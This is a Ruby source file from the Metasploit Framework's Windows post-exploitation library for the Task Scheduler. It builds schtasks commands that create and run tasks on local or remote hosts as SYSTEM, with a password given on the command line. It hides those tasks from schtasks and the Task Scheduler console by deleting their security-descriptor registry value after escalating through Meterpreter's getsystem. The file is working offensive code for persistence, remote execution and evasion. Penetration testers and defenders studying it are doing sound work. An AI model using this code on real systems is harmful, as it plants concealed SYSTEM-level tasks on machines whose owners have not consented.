# -*- coding: binary -*-

module Msf
  class Post
    module Windows
      #
      # Post module mixin for dealing with Windows Task Scheduler
      #
      module TaskScheduler # rubocop:disable Metrics/ModuleLength
        include ::Msf::Post::Common
        include ::Msf::Post::Windows::Priv
        include ::Msf::Module::UI::Message

        class TaskSchedulerError < StandardError; end
        class TaskSchedulerObfuscationError < TaskSchedulerError; end
        class TaskSchedulerSystemPrivsError < TaskSchedulerError; end

        TASK_REG_KEY = 'HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tree'.freeze
        # Security descriptor value
        TASK_SD_REG_VALUE = 'SD'.freeze
        # This Security Descriptor correspond to the builtin 'Guest' user and
        # built-in 'Guests' group. This has been generated from the following
        # security descriptor string: "O:BGG:BG"
        DEFAULT_SD = '01000080140000002400000000000000000000000102000000000005200000002202000001020000000000052000000022020000'.freeze
        # HRESULT returned in the field `Last Result` by `schtasks /query` when
        # the task is currently running (see
        # https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-erref/705fb797-2175-4a90-b5a3-3918024b10b8)
        SCHED_S_TASK_RUNNING = 0x00041301
        DEFAULT_SCHEDULE_TASK_TYPE = 'ONSTART'.freeze
        DEFAULT_SCHEDULE_MODIFIER = 1
        DEFAULT_SCHEDULE_RUNAS = 'SYSTEM'.freeze
        DEFAULT_SCHEDULE_OBFUSCATION_TECHNIQUE = 'SECURITY_DESC'.freeze

        def initialize(info = {})
          super

          register_advanced_options(
            [
              OptEnum.new(
                'ScheduleType', [
                  true,
                  'Schedule frequency for the new created task.',
                  DEFAULT_SCHEDULE_TASK_TYPE,
                  %w[MINUTE HOURLY DAILY WEEKLY MONTHLY ONCE ONSTART ONLOGON ONIDLE]
                ]
              ),
              # This defines the amount of minutes/hours/days/weeks/months,
              # depending on the ScheduleType value. When ONIDLE type is used,
              # this represents how many minutes the computer is idle before
              # the task starts. This value is not used with ONCE, ONSTART and
              # ONLOGON types
              OptInt.new(
                'ScheduleModifier', [
                  false,
                  'Schedule frequency modifier to define the amount of \'ScheduleType\'',
                  DEFAULT_SCHEDULE_MODIFIER
                ],
                conditions: ['ScheduleType', 'in', %w[MINUTE HOURLY DAILY WEEKLY MONTHLY ONIDLE] ]
              ),
              # Remote task creation does not seem to work on Windows XP and Windows Server 2003
              OptString.new(
                'ScheduleRemoteSystem', [
                  false,
                  'The remote system to connect to (prefer FQDN to IP). Not compatible with Windows XP/Server 2003.'
                ]
              ),
              # Use the permissions of this remote user account to schedule the
              # task remotely. It is recommended to inform the domain or '.\'
              # if it is a local user (e.g. MYDOMAIN\User1 or .\Administrator).
              # Also, when `ScheduleRemoteSystem` is set and not
              # `ScheduleUsername` and `SchedulePassword`, the current user
              # credentials are used.
              OptString.new(
                'ScheduleUsername', [
                  false,
                  'User account to schedule the task remotely.'
                ],
                conditions: ['ScheduleRemoteSystem', 'nin', [nil, '']]
              ),
              OptString.new(
                'SchedulePassword', [
                  false,
                  'Password of the user account set in \'ScheduleUsername\'.'
                ],
                conditions: ['ScheduleRemoteSystem', 'nin', [nil, '']]
              ),
              OptString.new(
                'ScheduleRunAs', [
                  false,
                  'Execute the task under this user account (default: SYSTEM).',
                  DEFAULT_SCHEDULE_RUNAS
                ]
              ),
              # Hide the task from "schtasks /query" and Task Scheduler by
              # deleting the associated Security Descriptor registry value.
              # Note that SYSTEM privileges are needed for this. It will try to
              # elevate privileges if the session is not already running under
              # the SYSTEM user.',
              OptEnum.new(
                'ScheduleObfuscationTechnique', [
                  false,
                  'Hide the task from "schtasks /query" and Task Scheduler (WARNING: the current '\
                  'session will be elevated to SYSTEM if it is not already) for this.',
                  DEFAULT_SCHEDULE_OBFUSCATION_TECHNIQUE,
                  %w[NONE SECURITY_DESC]
                ]
              )
            ], self.class
          )
        end

        def setup
          super
          check_compatibility
        end

        #
        # Create a scheduled task on a local or remote system.
        # Options are set from the datastore but can be overridden with the +opts+ hash.
        #
        # @param [String] task_name The name of the task to be created
        # @param [String] task_cmd The command that will be executed by the task
        # @param [Hash] opts The options to create the task
        # @option opts [String] :task_type The schedule frequency for the new
        #   created task. This can be one of these type: MINUTE HOURLY DAILY
        #   WEEKLY MONTHLY ONCE ONSTART ONLOGON ONIDLE.
        # @option opts [String] :modifier The schedule frequency modifier to define the amount of +:task_type+
        # @option opts [String] :runas The account under which the task will be executed
        # @option opts [String] :obfuscation The obfuscation technique used to
        #   hide the task from "schtasks /query" and Task Scheduler when the OS
        #   support it. The possible technique are:
        #   - NONE: no obfuscation will be performed
        #   - SECURITY_DESC: The Security Descriptor registry entry
        #     corresponding to this task is removed to hide it. It will try to
        #     elevate privileges if the session is not already running under
        #     the SYSTEM user.
        # @option opts [String] :remote_system The remote system to connect to
        #   (prefer FQDN to IP). Not compatible with Windows XP/Server 2003.
        # @option opts [String] :username The user account to schedule the task remotely
        # @option opts [String] :password The password of the user account set in +:username+
        def task_create(task_name, task_cmd, opts = {})
          schtasks_cmd = ['/create']
          task_type = opts[:task_type] || (datastore['ScheduleType'].present? ? datastore['ScheduleType'] : DEFAULT_SCHEDULE_TASK_TYPE)
          schtasks_cmd += ['/tn', "\"#{task_name}\"", '/tr', "\"#{task_cmd}\"", '/sc', task_type]
          if %w[MINUTE HOURLY DAILY WEEKLY MONTHLY ONIDLE].include?(task_type)
            modifier = opts[:modifier] || (datastore['ScheduleModifier'].present? ? datastore['ScheduleModifier'].to_s : DEFAULT_SCHEDULE_MODIFIER.to_s)
            if task_type == 'ONIDLE'
              schtasks_cmd += ['/i', modifier]
            else
              schtasks_cmd += ['/mo', modifier]
            end
          end
          unless %w[ONSTART ONLOGON ONIDLE].include?(task_type)
            schtasks_cmd += ['/st', '00:00:00']
          end
          runas = opts[:runas] || (datastore['ScheduleRunAs'].present? ? datastore['ScheduleRunAs'] : DEFAULT_SCHEDULE_RUNAS)
          schtasks_cmd += ['/ru', runas]
          schtasks_cmd << '/f' unless @old_schtasks

          begin
            schtasks_exec(get_schtasks_cmd_string(schtasks_cmd, opts))
          rescue TaskSchedulerError => e
            log_and_print("[Task Scheduler] Task creation failed: #{e}", level: :error)
            raise
          end

          # We want to make sure `opts` has preference over the datastore option
          obfuscation = opts.fetch(:obfuscation, datastore['ScheduleObfuscationTechnique'])
          return if obfuscation.nil? || obfuscation == 'NONE'

          begin
            delete_reg_key_value("#{TASK_REG_KEY}\\#{task_name}", TASK_SD_REG_VALUE, opts)
          rescue TaskSchedulerObfuscationError => e
            log_and_print("[Task Scheduler] Task obfuscation failed: #{e}")
            raise TaskSchedulerObfuscationError, 'Task obfuscation failed (the task has been created but won\'t be hidden)'
          end
        end

        #
        # Immediately run a scheduled task.
        # Options are set from the datastore but can be overridden with the +opts+ hash.
        #
        # @param [String] task_name The name of the task to be run
        # @param [Hash] opts The options to run the task
        # @option opts [String] :remote_system The remote system to connect to
        #   (prefer FQDN to IP). Not compatible with Windows XP/Server 2003.
        # @option opts [String] :username The user account to run the task remotely
        # @option opts [String] :password The password of the user account set in +:username+
        def task_start(task_name, opts = {})
          schtasks_cmd = ['/run', '/tn', task_name]
          schtasks_exec(get_schtasks_cmd_string(schtasks_cmd, opts))
        rescue TaskSchedulerError => e
          log_and_print("[Task Scheduler] Task starting failed: #{e}", level: :error)
          raise
        end

        #
        # Delete a scheduled task.
        # Options are set from the datastore but can be overridden with the +opts+ hash.
        #
        # @param [String] task_name The name of the task to be deleted
        # @param [Hash] opts The options to delete the task
        # @option opts [String] :obfuscation The obfuscation technique used to
        #   hide the task from "schtasks /query" and Task Scheduler when the OS
        #   support it. Set this option to the correct technique in order to be
        #   able to delete the task properly. The possible technique are:
        #   - NONE: no obfuscation has been performed
        #   - SECURITY_DESC: The Security Descriptor registry entry
        #     corresponding to this task was removed to hide it. This will
        #     restore it before attempting to delete the task. For this, it
        #     will also try to elevate privileges if the session is not already
        #     running under the SYSTEM user.
        # @option opts [String] :remote_system The remote system to connect to
        #   (prefer FQDN to IP). Not compatible with Windows XP/Server 2003.
        # @option opts [String] :username The user account to run the task remotely
        # @option opts [String] :password The password of the user account set in +:username+
        def task_delete(task_name, opts = {})
          # We want to make sure `opts` has preference over the datastore option
          obfuscation = opts.fetch(:obfuscation, datastore['ScheduleObfuscationTechnique'])
          if obfuscation && obfuscation != 'NONE'
            begin
              add_reg_key_value("#{TASK_REG_KEY}\\#{task_name}", TASK_SD_REG_VALUE, DEFAULT_SD, 'REG_BINARY', opts)
            rescue TaskSchedulerObfuscationError => e
              log_and_print("[Task Scheduler] Task deletion failed: #{e}")
              raise TaskSchedulerError, 'Task deobfuscation failed. The task cannot be deleted.'
            end
          end

          schtasks_cmd = ['/delete', '/tn', task_name, '/f']
          schtasks_exec(get_schtasks_cmd_string(schtasks_cmd, opts))
        rescue TaskSchedulerError => e
          log_and_print("[Task Scheduler] Task deletion failed: #{e}", level: :error)
          raise
        end

        #
        # Display the scheduled task information.
        # Options are set from the datastore but can be overridden with the +opts+ hash.
        #
        # @param [String] task_name The name of the task to be display
        # @param [Hash] opts The options to display the task
        # @option opts [String] :remote_system The remote system to connect to
        #   (prefer FQDN to IP). Not compatible with Windows XP/Server 2003.
        # @option opts [String] :username The user account to run the task remotely
        # @option opts [String] :password The password of the user account set in +:username+
        def task_query(task_name, opts = {})
          if @old_os
            schtasks_cmd = ['/query', '/v', '/fo', 'csv']
          else
            schtasks_cmd = ['/query', '/tn', task_name, '/v', '/fo', 'csv', '/hresult']
          end
          schtasks_exec(get_schtasks_cmd_string(schtasks_cmd, opts), with_result: true)
        rescue TaskSchedulerError => e
          log_and_print("[Task Scheduler] Task querying failed: #{e}", level: :error)
          raise
        end

        #
        # Module functions that are made private to classes that mix on this module
        #

        module_function

        def check_compatibility
          # Check Windows version to make sure we will use the correct supported command flags
          # - `schtasks.exe` on Windows prior to Windows Server 2003 SP1 has
          #   some different `/create` option flags.
          # - `schtasks.exe` on Windows prior to Vista has some
          #   different `/query` option flags - set @old_os to true
          # Also, on these OSes, `reg.exe` does not support the `/reg:64` flag.

          @old_schtasks = false
          @old_os = false

          version = get_version_info
          if version.build_number < Msf::WindowsVersion::Vista_SP0
            @old_os = true
            if version.build_number < Msf::WindowsVersion::Server2003_SP1
              @old_schtasks = true
            end
            if datastore['ScheduleRemoteSystem'].present?
              log_and_print(
                '[Task Scheduler] This OS version does not support remote schedule tasks. This is likely to fail.',
                level: :warning
              )
            end
          end
        end

        def log_and_print(msg, level: :debug)
          case level
          when :debug
            vprint_status(msg) if respond_to?(:vprint_status)
            dlog(msg)
          when :status
            vprint_status(msg) if respond_to?(:vprint_status)
            ilog(msg)
          when :warning
            vprint_warning(msg) if respond_to?(:vprint_warning)
            wlog(msg)
          when :error
            vprint_error(msg) if respond_to?(:vprint_error)
            elog(msg)
          end
        end

        def get_schtasks_cmd_string(schtasks_cmd, opts = {})
          cmd = schtasks_cmd.dup
          cmd.prepend('schtasks')
          system = opts[:remote_system] || (datastore['ScheduleRemoteSystem'].present? ? datastore['ScheduleRemoteSystem'] : nil)
          cmd += ['/s', system] if system
          username = opts[:username] || (datastore['ScheduleUsername'].present? ? datastore['ScheduleUsername'] : nil)
          cmd += ['/u', username] if username
          password = opts[:password] || (datastore['SchedulePassword'].present? ? datastore['SchedulePassword'] : nil)
          cmd += ['/p', password] if password
          cmd.join(' ')
        end

        def schtasks_exec(schtasks_cmd_str, with_result: false)
          log_and_print("[Task Scheduler] executing command: #{schtasks_cmd_str}")
          # Using a longer timeout in case the task scheduler operation takes place
          # on a remote host. The default timeout is not enough.
          result = cmd_exec_with_result(schtasks_cmd_str, nil, 240)
          return result if with_result
          unless result[1]
            raise TaskSchedulerError, "Command execution failed: #{result[0]}"
          end
        end

        def get_system_privs
          return if is_system?

          unless session.type == 'meterpreter'
            error = "Incompatible session type (#{session.type}), cannot get SYSTEM "\
                    'privileges to obfuscate the scheduled task.'
            log_and_print("[Task Scheduler] #{error}", level: :error)
            raise TaskSchedulerSystemPrivsError, error
          end
          unless session.ext.priv
            error = 'This Meterpreter session does not support `priv` extension, cannot '\
                    'get SYSTEM privileges to obfuscate the scheduled task.'
            log_and_print("[Task Scheduler] #{error}", level: :error)
            raise TaskSchedulerSystemPrivsError, error
          end
          log_and_print('[Task Scheduler] Trying to get SYSTEM privilege')
          results = session.priv.getsystem
          if results[0]
            log_and_print('[Task Scheduler] Got SYSTEM privilege')
          else
            raise TaskSchedulerSystemPrivsError
          end
        end

        def task_info_field(task_name, task_info, key)
          task_name = task_name.delete_prefix('"').delete_suffix('"')
          key = key.delete_prefix('"').delete_suffix('"')
          task_info = task_info.lines
          title_array = task_info.shift&.split(',')
          return unless title_array

          index_taskname = title_array.find_index { |v| v == '"TaskName"' }
          return unless index_taskname

          index = title_array.find_index { |v| v == "\"#{key}\"" }
          return unless index

          task_info.each do |line|
            value_array = line.split(',')
            next unless value_array[index_taskname] == "\"\\#{task_name}\""

            return value_array[index]&.delete_prefix('"')&.delete_suffix('"')
          end
          nil
        end

        def task_has_run?(task_name, task_info)
          # Depending on the Windows version, the 'Last Run Time' field is set
          # to '11/30/1999 12:00:00 AM' or 'N/A' when the task has not run yet
          !['11/30/1999 12:00:00 AM', 'N/A'].include?(task_info_field(task_name, task_info, 'Last Run Time'))
        end

        def task_is_still_running?(task_name, task_info)
          task_info_field(task_name, task_info, 'Last Result') == SCHED_S_TASK_RUNNING.to_s
        end

        def run_one_off_task(cmd, check_success: false)
          result = nil
          task_name = Rex::Text.rand_text_alpha(rand(8..15))
          log_and_print("[Task Scheduler] Creating the remote task #{task_name} to run '#{cmd}'")
          # Obfuscation is not possible since #run_one_off_task will be called
          # again by #task_create when it checks if the registry key value
          # exists. This will enter an infinite loop, creating tasks on the
          # remote host until it explodes. We certainly don't want this to happen!
          opts = { task_type: 'ONCE', runas: 'SYSTEM', obfuscation: 'NONE' }
          task_create(task_name, cmd, opts)

          log_and_print("[Task Scheduler] Starting the remote task #{task_name}")
          task_start(task_name)

          if check_success
            log_and_print('[Task Scheduler] Checking if the task succeeded')
            result = false
            try = 0
            task_info = nil
            has_run = loop do
              break false unless try < 5

              try += 1
              log_and_print("[Task Scheduler] Checking if the task has run already (##{try})")
              sleep 1
              task_info = task_query(task_name)[0]
              break true if task_has_run?(task_name, task_info) && !task_is_still_running?(task_name, task_info)
            end
            if has_run
              # The result is '0' if it succeeded
              last_result = task_info_field(task_name, task_info, 'Last Result')
              result = last_result == '0'
              if result
                log_and_print('[Task Scheduler] It seems to have succeeded')
              else
                log_and_print("[Task Scheduler] It seems to have failed (0x#{last_result.to_i.to_s(16)})", level: :warning)
              end
            end
          end

          log_and_print("[Task Scheduler] Deleting the remote task #{task_name}")
          task_delete(task_name, opts)

          result
        end

        def reg_key_value_exists?(reg_key, reg_value, opts = {})
          remote_host = opts[:remote_system].present? || datastore['ScheduleRemoteSystem'].present?
          result = false
          if remote_host
            begin
              result = run_one_off_task("reg query \\\"#{reg_key}\\\" /v \\\"#{reg_value}\\\"", check_success: true)
            rescue TaskSchedulerError => e
              log_and_print("[Task Scheduler] Could not query the key value remotely: #{e}")
            end
          else
            # The `/reg:64` flag is here to force read/write to the 64-bit
            # registry location. This is mandatory when the Meterpreter session
            # is x86 and the OS is x64. Since it is ignored on 32-bit systems,
            # we will always use it. Also, this option doesn't exist on Windows
            # XP/Server 2003, we need to remove it or it will fail.
            result = cmd_exec_with_result("reg query \"#{reg_key}\" /v \"#{reg_value}\"#{' /reg:64' unless @old_os}")[1]
          end

          result
        end

        def delete_reg_key_value(reg_key, reg_value, opts = {})
          log_and_print('[Task Scheduler] Removing the Security Descriptor registry key value to hide the task')

          log_and_print('[Task Scheduler] Checking if the key value exists')
          unless reg_key_value_exists?(reg_key, reg_value)
            raise TaskSchedulerObfuscationError, "The #{reg_value} key value does not exist. Obfuscation is not possible"
          end

          begin
            get_system_privs
          rescue TaskSchedulerSystemPrivsError
            raise TaskSchedulerObfuscationError, 'Could not obtain SYSTEM privilege, which is needed to delete the key value.'
          end

          remote_host = opts[:remote_system] || datastore['ScheduleRemoteSystem']
          log_and_print("[Task Scheduler] Deleting #{reg_value} in #{reg_key}#{" on remote host #{remote_host}" if remote_host.present?}")
          if remote_host.present?
            begin
              run_one_off_task("reg delete \\\"#{reg_key}\\\" /v \\\"#{reg_value}\\\" /f")
            rescue TaskSchedulerError => e
              raise TaskSchedulerObfuscationError, "Could not delete the key value: #{e}"
            end
          else
            result = cmd_exec_with_result("reg delete \"#{reg_key}\" /v \"#{reg_value}\" /f#{' /reg:64' unless @old_os}", nil, 15, { 'UseThreadToken' => true })
            unless result[1]
              raise TaskSchedulerObfuscationError, "Could not delete the key value. Error: #{result[0]}"
            end
          end
        end

        def add_reg_key_value(reg_key, reg_value, reg_data, reg_type, opts = {})
          log_and_print('[Task Scheduler] Restoring the Security Descriptor registry key value to unhide the task')

          # Override by default. It has to be explicitely set to false if we don't want the key to be overriden.
          unless opts[:override].nil? || opts[:override]
            log_and_print('[Task Scheduler] Checking if the key value exists')
            if reg_key_value_exists?(reg_key, reg_value)
              log_and_print("The #{reg_value} key value already exist. Set `opts[:override]` to true to override the value", level: :warning)
              return
            end
          end

          begin
            get_system_privs
          rescue TaskSchedulerSystemPrivsError
            raise TaskSchedulerObfuscationError, 'Could not obtain SYSTEM privilege, which is needed to restore the key value.'
          end

          remote_host = opts[:remote_system] || datastore['ScheduleRemoteSystem']
          log_and_print("[Task Scheduler] Adding #{reg_value} in #{reg_key}#{" on remote host #{remote_host}" if remote_host.present?}")
          if remote_host.present?
            begin
              run_one_off_task("reg add \\\"#{reg_key}\\\" /v \\\"#{reg_value}\\\" /t #{reg_type} /d \\\"#{reg_data}\\\" /f")
            rescue TaskSchedulerError => e
              raise TaskSchedulerObfuscationError, "Could not restore the key value: #{e}"
            end
          else
            result = cmd_exec_with_result("reg add \"#{reg_key}\" /v \"#{reg_value}\" /t #{reg_type} /d \"#{reg_data}\" /f#{' /reg:64' unless @old_os}", nil, 15, { 'UseThreadToken' => true })
            unless result[1]
              raise TaskSchedulerObfuscationError, "Could not restore the key value. Error: #{result[0]}"
            end
          end
        end
      end
    end
  end
end
